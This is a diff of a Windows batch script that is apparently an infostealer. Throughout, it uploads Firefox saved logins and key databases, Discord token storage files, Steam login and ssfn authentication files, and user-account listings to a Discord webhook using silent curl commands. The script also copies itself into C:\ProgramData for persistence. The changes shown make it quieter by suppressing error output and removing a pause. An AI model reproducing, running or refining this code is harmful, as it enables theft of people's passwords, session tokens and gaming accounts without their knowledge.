@@ -17,7 +17,7 @@ set "webhook=https://discord.com/api/webhooks/"
 
 :: GET IP ADDRESS
 :: --------------
-for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
+for /f "delims=[] tokens=2" %%a in ('2^>NUL ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
 
 :: GET TIME
 :: --------
@@ -56,7 +56,6 @@ goto skipnetuser
 	curl --silent --output /dev/null -F tasks=@"%netuser%" %webhook%
 	2>NUL del "%netuser%"
 :skipnetuser
-
 :: QUSER - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 :: ------------------------------------------------------------------
 goto skipquser
@@ -120,7 +119,7 @@ goto skipvivaldi
 :: -------------------------------------------------------
 goto skipfirefox
 	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- FIREFOX -```\"}"  %webhook%
-for /f %%f in ('dir /b "%appdata%\Mozilla\Firefox\Profiles"') do (
+for /f %%f in ('2^>NUL dir /b "%appdata%\Mozilla\Firefox\Profiles"') do (
 	curl --silent --output /dev/null -F level=@"%appdata%\Mozilla\Firefox\Profiles\%%f\logins.json" %webhook%
 	timeout /t 2 /nobreak > NUL
 	curl --silent --output /dev/null -F level=@"%appdata%\Mozilla\Firefox\Profiles\%%f\key3.db" %webhook%
@@ -143,7 +142,7 @@ goto skiposu
 :: -------------------------------------------------------
 goto skipdiscord
 	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- DISCORD -```\"}"  %webhook%
-for /f %%f in ('dir /b "%appdata%\discord\Local Storage\leveldb\"') do (
+for /f %%f in ('2^>NUL dir /b "%appdata%\discord\Local Storage\leveldb\"') do (
 	echo %%f|find ".ldb"
 	if errorlevel 1 (@echo off) else (
 		curl --silent --output /dev/null -F level=@"%appdata%\discord\Local Storage\leveldb\%%f" %webhook%
@@ -159,7 +158,7 @@ goto skipsteam
 	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- STEAM -```\"}"  %webhook%
 	curl --silent --output /dev/null -F steamusers=@"C:\Program Files (x86)\Steam\config\loginusers.vdf" %webhook%
 	curl --silent --output /dev/null -F loginusers=@"C:\Program Files\Steam\config\loginusers.vdf" %webhook%
-for /f %%s in ('dir /b "C:\Program Files (x86)\Steam\"') do (
+for /f %%s in ('2^>NUL dir /b "C:\Program Files (x86)\Steam\"') do (
 	echo %%s|find "ssfn"
 	if errorlevel 1 (@echo off) else (
 		curl --silent --output /dev/null -F auth=@"C:\Program Files (x86)\Steam\%%s" %webhook%
@@ -167,7 +166,7 @@ for /f %%s in ('dir /b "C:\Program Files (x86)\Steam\"') do (
 		timeout /t 2 /nobreak > NUL
 	)
 )
-for /f %%s in ('dir /b "C:\Program Files\Steam\"') do (
+for /f %%s in ('2^>NUL dir /b "C:\Program Files\Steam\"') do (
 	echo %%s|find "ssfn"
 	if errorlevel 1 (@echo off) else (
 		curl --silent --output /dev/null -F auth=@"C:\Program Files\Steam\%%s" %webhook%
@@ -235,7 +234,6 @@ set "vpath=C:\ProgramData"
 
 :: Copy the batch to the hidden location
 if not "%~dp0"=="%vpath%\" (
-pause
  2>NUL del /ah "%vpath%\%bname%"
   >NUL copy "%~f0" "%vpath%\%bname%"
 )
